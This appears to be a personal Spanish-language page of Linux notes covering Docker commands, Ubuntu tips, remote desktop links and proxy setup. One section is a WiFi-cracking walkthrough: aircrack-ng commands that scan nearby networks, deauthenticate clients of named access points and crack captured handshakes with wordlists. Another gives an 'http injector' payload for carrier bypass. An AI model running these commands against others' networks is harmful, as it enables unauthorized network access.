+&lt;p&gt;Remmina, un cliente de escritorio remoto para Linux&lt;br /&gt;
+https://www.redeszone.net/2014/12/20/remmina-un-cliente-de-escritorio-remoto-para-linux/&lt;/p&gt;
+
+&lt;p&gt;Entornos graficos para Linux&lt;br /&gt;
+https://www.vozidea.com/entorno-grafico-escritorio-remoto-ubuntu&lt;/p&gt;
+
+&lt;p&gt;Lanzar aplicaciones gráficas desde una sesión SSH &lt;br /&gt;
+https://www.linuxito.com/gnu-linux/nivel-medio/550-lanzar-aplicaciones-graficas-desde-una-sesion-ssh
+Entorno gráfico remoto usando open-ssh&lt;br /&gt;
+https://linuxparalasmasas.wordpress.com/2007/08/27/6/&lt;/p&gt;
+
+&lt;p&gt;Escritorio remoto RDP en Linux&lt;br /&gt;
+http://www.estrellateyarde.org/utilidades/escritorio-remoto-rdp-en-linux&lt;/p&gt;
+
+&lt;p&gt;Montar un Linux Terminal Server, y acceder desde Windows o Linux&lt;br /&gt;
+https://www.linux-party.com/35-linux/6935-montar-un-linux-terminal-server-y-acceder-desde-windows-o-linux&lt;/p&gt;
+
+&lt;p&gt;Conectar con VNC&lt;br /&gt;
+http://granada.sourceforge.net/recetas/receta033.html&lt;/p&gt;
+
+&lt;p&gt;Cómo instalar y configurar XRDP en Ubuntu&lt;br /&gt;
+https://clouding.io/kb/como-instalar-y-configurar-xrdp-en-ubuntu/&lt;/p&gt;
+
+&lt;p&gt;Abrir aplicaciones con interfaz gráfica como usuario root&lt;br /&gt;
+https://geekland.eu/abrir-aplicaciones-graficas-como-root/&lt;/p&gt;
+
+&lt;p&gt;Infraestructura aplicada a la programacion&lt;br /&gt;
+Para Plataformar un servidor&lt;br /&gt;
+Que es una imagen&lt;br /&gt;
+Que es un contenedor&lt;br /&gt;
+Cap 31 - Como funciona cuando tienen partes en comun entre imagenes.&lt;br /&gt;
+Cap 33 - Puertos&lt;br /&gt;
+Cap 37 - Volumenes&lt;br /&gt;
+Cap 40 - Variables de entorno&lt;br /&gt;
+Cap 45 - Como ingresar a un contenedor&lt;/p&gt;
+
+&lt;h1 id=&quot;docker-referencias-rápidas&quot;&gt;Docker Referencias rápidas&lt;/h1&gt;
+
+&lt;h2 id=&quot;buscar-una-imagen-para-descargar&quot;&gt;buscar una imagen para descargar&lt;/h2&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker search ubuntu&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;descargar-una-imagen&quot;&gt;descargar una imagen&lt;/h2&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker pull ubuntu&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;listar-imagenes-descargadas&quot;&gt;listar imagenes descargadas&lt;/h2&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker images&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;entrar-a-una-imagen-en-modo-interactivorun&quot;&gt;entrar a una imagen en modo interactivo(run)&lt;/h2&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker run -i -t ubuntu /bin/bash&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Esto genera una nuevo contenedor
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker run --rm --name nombrecontenedor -it ubuntu /bin/bash&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Este comando ademas de lo anterior lo borra al salir
+En algunos casos puede ser necesario invocar &quot;nombre_imagen:nombre:tag
+Alguno parametros
+--rm Borra el contenedor al salir
+--it modo interactivo
+--name se indica el nombre del contenedor, sino el sistema le asigna uno aleatoriamente.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;salir-de-un-contenedor&quot;&gt;salir de un contenedor&lt;/h2&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;exit&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;listar-contenedores-disponibles-ps&quot;&gt;listar contenedores disponibles (ps)&lt;/h2&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker ps -a&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;iniciar-un-contendor-start&quot;&gt;iniciar un contendor (start)&lt;/h2&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker start ubuntu&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;a continuacion debe ir un parámetro, pudiéndose utilizar su identificador (CONTAINDER ID) o su nombre (NAMES).
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;detener-un-contendor&quot;&gt;detener un contendor&lt;/h2&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker stop&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;a continuacion debe ir un parámetro, pudiéndose utilizar su identificador (CONTAINDER ID) o su nombre (NAMES).
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;guardar-una-nueva-imagen&quot;&gt;guardar una nueva imagen&lt;/h2&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker commit ef7e107e0aae ubuntu:14.04&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Los parámetros son id de contenedor y nombre de la nueva imagen
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;como-borrar-un-contenedor&quot;&gt;como borrar un contenedor&lt;/h2&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker rm ef7e107e0aae&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;El parámetro esta claro que es el id del contenedor
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;como-borrar-una-imagen&quot;&gt;como borrar una imagen&lt;/h2&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker rmi b72889fa879c&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;ingresar-interactivamente-a-un-contenerdor-que-esta-iniciado&quot;&gt;ingresar interactivamente a un contenerdor que esta iniciado&lt;/h2&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker container exec -it container-name /bin/bash&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;reiniciar-un-contenedor&quot;&gt;reiniciar un contenedor&lt;/h2&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker restart Ubuntu-git-config&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Ubuntu-git-config es el nombre del cotenedor
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;arrancar-un-contenedor-asociando-una-carpeta-real-a-una-carpeta-interna-del-contenedorvolumen&quot;&gt;Arrancar un contenedor asociando una carpeta real a una carpeta interna del contenedor(volumen)&lt;/h2&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker run --name ubuntu-temp -it -v /home/desauser/Documentos/ws_git:/home/ws_git ubuntu /bin/bash&lt;/code&gt;
+    Una vez instanciada la imagen ya queda creado el volumen, que se puede acceder desde otro contenedor.
+    el primer parametro es la carpeta fisica, el segundo parametro es la carpeta dentro del contenedor
+&lt;code class=&quot;highlighter-rouge&quot;&gt;docker run --rm --name ubuntu-temp2 -it -v $HOME/Documentos:/home/docs ubuntu /bin/bash&lt;/code&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;dockerfile&quot;&gt;Dockerfile&lt;/h1&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Generar una nueva imagen a partir de otra con Dockerfile `docker build --no-cache --pull -t &quot;nombre_imagen:dato_tag&quot; .`
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;falta-ver&quot;&gt;Falta ver&lt;/h2&gt;
+&lt;p&gt;Dockerfile&lt;br /&gt;
+Enlazar 2 contenedores&lt;/p&gt;
+
+&lt;p&gt;+Tutorial Docker: conceptos básicos y primeros pasos&lt;br /&gt;
+  https://www.muylinux.com/2016/04/19/tutorial-docker/
+(Estos pasos me funcionaron)&lt;/p&gt;
+
+&lt;p&gt;Recetas Docker’s&lt;br /&gt;
+https://recetas-docker.readthedocs.io/es/latest/index.html&lt;/p&gt;
+
+&lt;p&gt;Gestión de volúmenes en contenedores&lt;br /&gt;
+https://dockertips.com/volumenes&lt;/p&gt;
+
+&lt;p&gt;Volumenes Dockers&lt;br /&gt;
+https://javiermartinalonso.github.io/drafts/dockers/2017-10-04-docker-Dockers-volumenes.html&lt;/p&gt;
+
+&lt;p&gt;Volúmenes y datos persistentes en Docker&lt;br /&gt;
+https://welcomedevelopers.es/docker/volumenes-y-datos-persistentes-en-docker/&lt;/p&gt;
+
+&lt;p&gt;Docker for dummies (sonarqube)&lt;br /&gt;
+https://www.adictosaltrabajo.com/2015/07/29/docker-for-dummies/ 
+docker run -d –name sonarqube -p 9000:9000 sonarqube&lt;/p&gt;
+
+&lt;p&gt;Cómo instalar Docker en Ubuntu 18.04&lt;br /&gt;
+https://ubunlog.com/como-instalar-docker-en-ubuntu-18-04-y-derivados/&lt;/p&gt;
+
+&lt;p&gt;Crear imágenes a medida en Docker con Dockerfile&lt;br /&gt;
+https://colaboratorio.net/davidochobits/sysadmin/2018/crear-imagenes-medida-docker-dockerfile/&lt;/p&gt;
+
+&lt;p&gt;Gestión del almacenamiento en docker(volúmenes)&lt;br /&gt;
+https://www.josedomingo.org/pledin/2016/05/gestion-del-almacenamiento-en-docker/&lt;/p&gt;
+
+&lt;p&gt;Cómo crear Contenedores de Docker corriendo en Memcached&lt;br /&gt;
+https://www.digitalocean.com/community/tutorials/docker-explicado-como-crear-contenedores-de-docker-corriendo-en-memcached-es&lt;/p&gt;
+
+&lt;p&gt;Docker vs Vagrant: diferencias y similitudes&lt;br /&gt;
+https://www.campusmvp.es/recursos/post/Docker-vs-Vagrant-diferencias-y-similitudes-y-cuando-usar-cada-uno.aspx&lt;/p&gt;
+
+&lt;p&gt;docker - Tips para recordar&lt;br /&gt;
+https://dockertips.com/tips-para-recordarque&lt;/p&gt;
+
+&lt;p&gt;Desplegando owncloud con Docker&lt;br /&gt;
+https://hollmanenciso.com/desplegando-owncloud-con-docker/&lt;/p&gt;
+
+&lt;p&gt;demo owncloud&lt;br /&gt;
+http://demo.owncloud.org/index.php&lt;/p&gt;
+
+&lt;p&gt;OwnCloud o cómo crear un servicio de almacenamiento online&lt;br /&gt;
+https://raiolanetworks.es/blog/owncloud-o-como-crear-un-servicio-de-almacenamiento-online/&lt;/p&gt;
+
+&lt;h4 id=&quot;no-suspender-al-cerrar-la-tapa-en-ubuntu-1804&quot;&gt;No suspender al cerrar la tapa en Ubuntu 18.04&lt;/h4&gt;
+&lt;p&gt;https://pc-solucion.es/2018/08/20/no-suspender-al-cerrar-la-tapa-en-ubuntu-18-04/&lt;/p&gt;
+
+&lt;h4 id=&quot;solución-al-error-de-dependencias-incumplidas&quot;&gt;Solución al error de dependencias incumplidas&lt;/h4&gt;
+&lt;p&gt;https://ubunlog.com/resolver-las-dependencias-de-paquetes/
+sudo apt-get autoremove
+sudo apt-get autoclean
+sudo apt-get update
+sudo apt-get -f install&lt;/p&gt;
+
+&lt;h4 id=&quot;pasa-saber-la-ip-de-mi-equipo-como-saber-mi-ip&quot;&gt;Pasa saber la ip de mi equipo (como saber mi ip)&lt;/h4&gt;
+&lt;p&gt;hostname -I&lt;/p&gt;
+
+&lt;p&gt;Usuario por el cual estoy conectado
+whoami&lt;/p&gt;
+
+&lt;p&gt;Datos del equipo
+hostnamectl&lt;/p&gt;
+
+&lt;p&gt;SCRIPTS EN BASH
+https://www.atareao.es/tutorial/scripts-en-bash/
+http://es.tldp.org/COMO-INSFLUG/COMOs/Bash-Prog-Intro-COMO/Bash-Prog-Intro-COMO.html#toc5&lt;/p&gt;
+
+&lt;p&gt;Muchos paquetes para muchas versiones Lunux.
+https://pkgs.org/&lt;/p&gt;
+
+&lt;p&gt;Gestor de paquetes deb un poco mas sencillo que dpkg
+http://manpages.ubuntu.com/manpages/bionic/man1/gdebi.1.html#synopsis&lt;/p&gt;
+
+&lt;p&gt;Programas para instalar luego de formatear&lt;/p&gt;
+
+&lt;p&gt;Resetter
+WhatsDesk
+Anydesk
+Docker
+AppGrid
+Alarma
+Psensor&lt;/p&gt;
+
+&lt;p&gt;Estensiones Gnome&lt;/p&gt;
+
+&lt;p&gt;Clima
+Window Corner Preview
+FreeMem&lt;/p&gt;
+
+&lt;p&gt;Segundo Orden&lt;/p&gt;
+
+&lt;p&gt;Remmina
+Retoques&lt;/p&gt;
+
+&lt;p&gt;Config&lt;/p&gt;
+
+&lt;p&gt;Memoria Swap&lt;/p&gt;
+
+&lt;p&gt;Soft de Trabajo&lt;/p&gt;
+
+&lt;p&gt;Git
+Terminator
+Double Commander
+Sublime text
+VScode&lt;/p&gt;
+
+&lt;p&gt;Ubuntu: Particionamiento recomendado&lt;br /&gt;
+http://www.ubuntufacil.com/2014/05/ubuntu-particionamiento-recomendado/&lt;/p&gt;
+
+&lt;p&gt;Guía Windows 10 y Ubuntu 18 ¡Aprovecha ambos en el mismo equipo!&lt;br /&gt;
+https://www.muycomputer.com/2018/04/29/windows-10-y-ubuntu-18/&lt;/p&gt;
+
+&lt;h4 id=&quot;como-conocer-en-que-carpeta-esta-un-ejecutable&quot;&gt;Como conocer en que carpeta esta un ejecutable&lt;/h4&gt;
+
+&lt;p&gt;Con el comando top se conoce el nombre del proceso.&lt;br /&gt;
+Con el comando which se conoce el nombre del archivo en disco&lt;br /&gt;
+P.ej. which code&lt;/p&gt;
+
+&lt;h3 id=&quot;vagrant-la-herramienta-para-crear-entornos-de-desarrollo-reproducibles&quot;&gt;Vagrant, la herramienta para crear entornos de desarrollo reproducibles&lt;/h3&gt;
+&lt;p&gt;https://www.conasa.es/blog/vagrant-la-herramienta-para-crear-entornos-de-desarrollo-reproducibles/&lt;/p&gt;
+
+&lt;h3 id=&quot;aplicaciones-para-grabar-el-escritorio-en-ubuntu&quot;&gt;Aplicaciones para grabar el escritorio en Ubuntu&lt;/h3&gt;
+&lt;p&gt;https://ubunlog.com/aplicaciones-para-grabar-el-escritorio-en-ubuntu/&lt;/p&gt;
+
+&lt;h3 id=&quot;cómo-saber-si-una-tarjeta-ethernet-está-siendo-reconocida-en-linux&quot;&gt;Cómo saber si una tarjeta Ethernet está siendo reconocida en Linux&lt;/h3&gt;
+&lt;p&gt;https://www.neoguias.com/como-saber-si-tarjeta-ethernet-reconocida-linux/&lt;/p&gt;
+
+&lt;h3 id=&quot;webscraping-con-jupyter-notebook&quot;&gt;WebScraping con Jupyter Notebook&lt;/h3&gt;
+
+&lt;p&gt;sudo docker run –rm -p 8888:8888 jupyter/scipy-notebook:17aba6048f44
+http://localhost:8888/?token=35380eef6ef45c76887aa563ae646038d2c93cc60bb1cff6&lt;/p&gt;
+
+&lt;p&gt;Primeros pasos con Jupyter Notebook&lt;br /&gt;
+https://www.adictosaltrabajo.com/2018/01/18/primeros-pasos-con-jupyter-notebook/&lt;/p&gt;
+
+&lt;p&gt;Otra pagina para Scraping
+https://webleonardoscpg.glitch.me/home.html&lt;/p&gt;
+
+&lt;h3 id=&quot;borrar-archivos-recursivamente&quot;&gt;Borrar archivos recursivamente.&lt;/h3&gt;
+&lt;p&gt;No funciona como en DOS con un parametro /s o algo así.
+find . -type f -name ‘*.o’ -delete&lt;/p&gt;
+
+&lt;h3 id=&quot;actualizar-una-sola-aplicaciones-desde-la-linea-de-comandos&quot;&gt;Actualizar una sola aplicaciones desde la linea de comandos&lt;/h3&gt;
+&lt;p&gt;apt-get install firefox –only-upgrade
+apt-get install multisystem –only-upgrade&lt;/p&gt;
+
+&lt;h3 id=&quot;temas-de-vps&quot;&gt;Temas de VPS&lt;/h3&gt;
+
+&lt;h4 id=&quot;script-para-instalar-vps-propio&quot;&gt;Script para instalar VPS propio&lt;/h4&gt;
+&lt;p&gt;DANKELTHAHER FREE
+https://github.com/DankelthaherManager/ADM-MANAGER-DANKELTHAHER/blob/master/instala.sh
+algunas claves que no se si andan
+y Configuracion incial una vez instalado script
+https://www.youtube.com/watch?v=PisR5ASj4m4&lt;/p&gt;
+
+&lt;h4 id=&quot;payload&quot;&gt;Payload&lt;/h4&gt;
+&lt;p&gt;HEAD HTTP/1.1
+Host: *.viadeo.com\n&lt;/p&gt;
+
+&lt;h4 id=&quot;como-buscar-un-host-y-sacar-sus-domiños-y-como-validar-un-host-facil-y-rápido&quot;&gt;Como buscar un host y sacar sus domiños y como validar un host facil y rápido&lt;/h4&gt;
+&lt;p&gt;https://www.youtube.com/watch?v=QQyahYnqhKY&amp;amp;pbjreload=10&lt;/p&gt;
+
+&lt;h4 id=&quot;como-crear-un-payload-rápido--conseguir-host-funcionales--100-efectivo-como-crear-payload&quot;&gt;Como Crear Un Payload Rápido &amp;amp; Conseguir Host Funcionales 💯 |100% Efectivo| como crear payload&lt;/h4&gt;
+&lt;p&gt;https://www.youtube.com/watch?v=tGEkopmdOxw&lt;/p&gt;
+
+&lt;h4 id=&quot;como-crear-mi-propio-servidor-http-injector-mega-bien-explicado---leer-descripción&quot;&gt;Como crear mi propio servidor http injector (Mega bien explicado) - (LEER DESCRIPCIÓN)&lt;/h4&gt;
+&lt;p&gt;https://www.youtube.com/watch?v=7jo0h4v5nHU
+COMO CREAR Y CONFIGURAR UNA VPS PARA HTTP INJECTOR Y OTRAS APPS // VPS GRATIS
+https://www.youtube.com/watch?v=R9iR8pqEYqw&lt;/p&gt;
+
+&lt;h3 id=&quot;gestor-de-red-que-viene-en-kde-plasta-en-gnome&quot;&gt;Gestor de red que viene en KDE Plasta en Gnome&lt;/h3&gt;
+&lt;p&gt;nm-connection-editor&lt;/p&gt;
+
+&lt;h3 id=&quot;creackeando-una-red-wifi-con-linux&quot;&gt;Creackeando una red wifi con linux&lt;/h3&gt;
+&lt;p&gt;https://esgeeks.com/cracking-claves-wifi-con-aircrack-ng/
+https://esgeeks.com/formas-de-crear-diccionario-para-fuerza-bruta/&lt;/p&gt;
+
+&lt;p&gt;sudo airmon-ng&lt;/p&gt;
+
+&lt;p&gt;PHY	Interface	Driver		Chipset&lt;/p&gt;
+
+&lt;p&gt;phy1	wlp1s0		iwlwifi		Intel Corporation Wireless 8260 (rev 3a)
+phy2	wlx20e01704b3f0	mt7601u		Ralink Technology, Corp. MT7601U
+wlan0mon&lt;/p&gt;
+
+&lt;p&gt;sudo airmon-ng check kill
+Run it as root&lt;/p&gt;
+
+&lt;p&gt;sudo airmon-ng check&lt;/p&gt;
+
+&lt;p&gt;sudo airmon-ng start wlan0
+sudo airmon-ng start wlan0mon&lt;/p&gt;
+
+&lt;p&gt;Killing these processes:&lt;/p&gt;
+
+&lt;p&gt;PID Name
+ 1306 wpa_supplicant
+22800 avahi-daemon
+22808 avahi-daemon&lt;/p&gt;
+
+&lt;p&gt;sudo airodump-ng wlan0mon
+sudo airodump-ng wlx20e01704b3f0&lt;/p&gt;
+
+&lt;p&gt;BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID&lt;/p&gt;
+
+&lt;p&gt;E8:91:20:DD:1D:7C  -30       14        7    0   2  54e. WPA2 CCMP   PSK  z2                                                                                &lt;br /&gt;
+ CC:2D:21:58:82:48  -78       11       57    0   3  54e  WPA2 CCMP   PSK  Tenda_588248                                                                                       &lt;br /&gt;
+ D8:32:14:51:06:20  -79       12        0    0   7  54e  WPA2 CCMP   PSK  Tenda_510620                                                                                       &lt;br /&gt;
+ 58:D9:D5:1C:FF:F8  -83        9        0    0  11  54e  WPA2 CCMP   PSK  Tenda_1CFFF8                                                                                       &lt;br /&gt;
+ CC:2D:21:59:6B:D8  -84       13        2    0  10  54e  WPA2 CCMP   PSK  Tenda_596BD8                                                                                       &lt;br /&gt;
+ 50:0F:F5:D5:B5:28  -88        2       18    0   1  54e  WPA2 CCMP   PSK  Tenda_D5B528                                                                                        &lt;br /&gt;
+ DA:D7:75:62:B0:64  -88        4        0    0  11  54e  OPN              TeleCentro Wifi                                                                                     &lt;br /&gt;
+ D8:D7:75:62:AF:62  -88        3        0    0  11  54e  WPA2 CCMP   PSK  TeleCentro-af5d&lt;/p&gt;
+
+&lt;p&gt;sudo airodump-ng -c 2 –bssid E8:91:20:DD:1D:7C –write MotoE2 wlan0mon
+sudo airodump-ng -c 2 –bssid E8:91:20:DD:1D:7C –write MotoE2 wlx20e01704b3f0&lt;/p&gt;
+
+&lt;p&gt;sudo airodump-ng -c 11 –bssid D8:D7:75:62:AF:62 –write TeleAFD5 wlx20e01704b3f0
+sudo airodump-ng -c 5 –bssid D8:32:14:50:91:50 –write Tenda_509150 wlx20e01704b3f0
+sudo airodump-ng -c 3 –bssid CC:2D:21:58:82:48 –write Tenda_588248 wlx20e01704b3f0&lt;/p&gt;
+
+&lt;p&gt;aireplay-ng -0 10 –a 02:08:22:7E:B7:6F  -e EsGeeks wlan0mon
+sudo aireplay-ng -0 10 -a E8:91:20:DD:1D:7C -e z2 wlan0mon
+sudo aireplay-ng -0 10 -a E8:91:20:DD:1D:7C -e z2 wlx20e01704b3f0
+sudo aireplay-ng -0 10 -a CC:2D:21:58:82:48 -e z2 wlx20e01704b3f0&lt;/p&gt;
+
+&lt;p&gt;aircrack-ng EsGeeks-01.cap -w rockyou.txt
+sudo aircrack-ng MotoE2-01.cap -w 
+sudo aircrack-ng Tenda_588248-01.cap -w aaa.txt&lt;/p&gt;
+
+&lt;p&gt;crunch 8 8 qwertyui –o dic.txt
+crunch 4 4 -f char.lst lalpha -o 05.txt&lt;/p&gt;
+
+&lt;h3 id=&quot;udemy-dl-descargar-cursos-de-udemy-para-uso-personal&quot;&gt;udemy-dl: Descargar cursos de Udemy para uso personal&lt;/h3&gt;
+&lt;p&gt;https://esgeeks.com/descargar-videos-cursos-udemy/&lt;/p&gt;
+
+&lt;p&gt;como usar las cookies
+https://github.com/r0oth3x49/udemy-dl/issues/389#issuecomment-491903900&lt;/p&gt;
+
+&lt;p&gt;cd $HOME/Descargas/capacitacion/udemy-dl-master/
+Tener en cuenta que por default no queda en el path, asi que hay que ir a la carpeta donde esté el archivo .py
+Si se ingresa usu:pass a mano suele dar error, lo mejor es invocar a la cookie haya descargado el navegador.
+  Las indicacines están en el archivo readme.
+  Se debre crear un archivo e invocarlo con el parámetro -k
+  El contenido del archivo txt es solo:
+  access_token=&lt;valor_de_cookie&gt;&lt;/valor_de_cookie&gt;&lt;/p&gt;
+
+&lt;p&gt;sintaxis básica.
+python udemy-dl.py https://www.udemy.com/course/curso-basico-de-django-paginas-web-con-python/ -k cookie.txt&lt;/p&gt;
+
+&lt;h3 id=&quot;instalar-megasync&quot;&gt;Instalar MegaSync&lt;/h3&gt;
+&lt;p&gt;https://nksistemas.com/megasync-para-linux-te-mostramos-como-hacer-la-instalacion/&lt;/p&gt;
+
+&lt;h3 id=&quot;buscar-e-instalar-desde-paquetes-snap&quot;&gt;Buscar e Instalar desde paquetes snap&lt;/h3&gt;
+&lt;p&gt;https://snapcraft.io/&lt;/p&gt;
+
+&lt;h3 id=&quot;como-ver-la-pantalla-del-telefono-android-en-la-pc&quot;&gt;Como ver la pantalla del telefono android en la pc&lt;/h3&gt;
+&lt;p&gt;Se hace con un programa java llamado:
+http://droid-at-screen.org/
+-Se descarga el archivo jar 
+  y se ejecuta: 
+  java -jar droidAtScreen-a.b.c.jar
+Si pide la ruta del comando externo ADB
+Consultar con 
+which adb
+Suele ser la ruta:
+/usr/bin/adb&lt;/p&gt;
+
+&lt;p&gt;wget https://bintray.com/artifact/download/ribomation/maven/droidAtScreen-1.2.jar
+wget https://bintray.com/artifact/download/ribomation/maven/droidAtScreen-1.1.jar&lt;/p&gt;
+
+&lt;p&gt;Nota: es necesario tener habilitado depuracion usb dentro de modo desarrolador&lt;/p&gt;
+
+&lt;h3 id=&quot;instalar-openboard-con-snap&quot;&gt;Instalar openboard con snap&lt;/h3&gt;
+&lt;p&gt;sudo snap install openboard
+https://openboard.ch/download.en.html
+Si no se instala con snap, seguir los pasos que estan en el siguiente enlace de gitlab.
+https://gitlab.com/simbd/Scripts_Ubuntu/raw/master/Openboard_1804.sh?&lt;strong&gt;cf_chl_captcha_tk&lt;/strong&gt;=83730dc89cea5ca5c3790d72ecb3eb72449a97d2-1585794291-0-AVCNl4ypqgQIBla0Ajs0izefIWki-Vicu1FTPqYbNO-AcwSPxFPI2tkdtb-6mWionkr4LYX_hAGbdeQP04Gr_qAwKvMRniSEeGesmReJ8ABfbxji_hR0BMHau8p36F4YEb4JIIbmr6_8HEcLpCwFrkOX3xIEORv6kES6YAdu7X6J0LNp81Fum2q_RIprufJjvuSfcToQGEirzH1QjURie2ragTXA8jPDd9iQR2MHa5e4mNqUjs5SlFxHV1-mf4Yz0quRDvhmi_UYiqWyHpgdgqYXJnG3luGcLooQMbdbjGt2jlO9NP6mAx_dNtHW2h0IcxTrX90aevOYfxJl4zalJZYffU6Yf8LzTfSy5Vy__zZEjFJMnRIuamu_T0j3KeIJ_oW3Te7obypOlffiSfKCSbdMg0X-KnHOfMs5Omuhp8KXIdhVrTi6SbVyKlHcpIW1JUaXyCwI6wraKg2O9XsiVrCFnbf2qPFODwxNtrxsgdCk31N1bY2c_HlUPqtw7VQ2cjDhi1hivj-GDQUDy8F2G9vjnWQ-DePMIpFYvIoQokzxn6vzndE4f4WxrpjVYsqn-Q&lt;/p&gt;
+
+&lt;h3 id=&quot;como-saber-que-placa-wifi-esta-instalada-con-un-solo-comando&quot;&gt;Como saber que placa wifi esta instalada, con un solo comando&lt;/h3&gt;
+&lt;p&gt;lspci | grep Wireless&lt;/p&gt;
+
+&lt;h3 id=&quot;como-usar-linux-screen&quot;&gt;Como usar Linux Screen&lt;/h3&gt;
+&lt;p&gt;Para crear sesiones virtuales y recuperarlas luego.
+Sobretodo para sesiones en servidor.
+Como nunca se apagan, nuestra sesion quedará como en pausa para la proxima vez, aunque se corte la conexión.
+https://www.hostinger.es/tutoriales/instalar-usar-linux-screen/
+screen a secas para iniciar.
+para darle un nombre a la sesion
+screen -S aaa
+listar las sesiones
+screen -ls
+para restaurar la sesion virtual, sea por numero de sesio/proceso o por nombre de sesion.
+screen -r aaa
+screen -r 13031.pts-0.vps-1771262-x
+dejar sesion en ejecucion
+Ctrl + d&lt;/p&gt;
+
+&lt;h3 id=&quot;cosas-de-proxy-en-linux&quot;&gt;Cosas de Proxy en Linux&lt;/h3&gt;
+
+&lt;h4 id=&quot;ubuntu---configurar-autenticación-de-proxy-en-la-consola&quot;&gt;Ubuntu - Configurar autenticación de proxy en la consola&lt;/h4&gt;
+
+&lt;p&gt;Para verificar las variables de entorno
+env | grep proxy
+tambien 
+printenv | grep proxy&lt;/p&gt;
+
+&lt;p&gt;Cree el archivo de configuración dentro del directorio /etc/profile.d.
+sudo nano /etc/profile.d/proxy.conf&lt;/p&gt;
+
+&lt;p&gt;Aquí está el contenido del archivo:
+export http_proxy=http://gohan:mypass123@192.168.0.10:3128
+export http_proxy=http://192.168.43.1:44355&lt;/p&gt;
+
+&lt;p&gt;En nuestro ejemplo, Ubuntu utilizará el servidor proxy 192.168.0.10 y su puerto 3128.
+En nuestro ejemplo, Ubuntu usará el usename gohan y la contraseña mypass123 para autenticarse.&lt;/p&gt;
+
+&lt;p&gt;Al reiniciar el equipo, el sistema utilizará automáticamente la configuración de proxy.
+reboot&lt;/p&gt;
+
+&lt;p&gt;Si no desea reiniciar el equipo, utilice el comando source para habilitar la configuración de proxy.
+source /etc/profile.d/proxy.conf&lt;/p&gt;
+
+&lt;p&gt;¡Felicitaciones! Ha configurado la autenticación de proxy de Ubuntu correctamente.&lt;/p&gt;
+
+&lt;h4 id=&quot;para-utilizar-git-desde-la-terminal-con-proxy-con-autenticación&quot;&gt;Para utilizar git desde la terminal con proxy con autenticación&lt;/h4&gt;
+
+&lt;p&gt;Comando para utilizar:&lt;/p&gt;
+
+&lt;p&gt;git config –global http.proxy http://proxyuser:proxypwd@proxy.server.com:8080&lt;/p&gt;
+
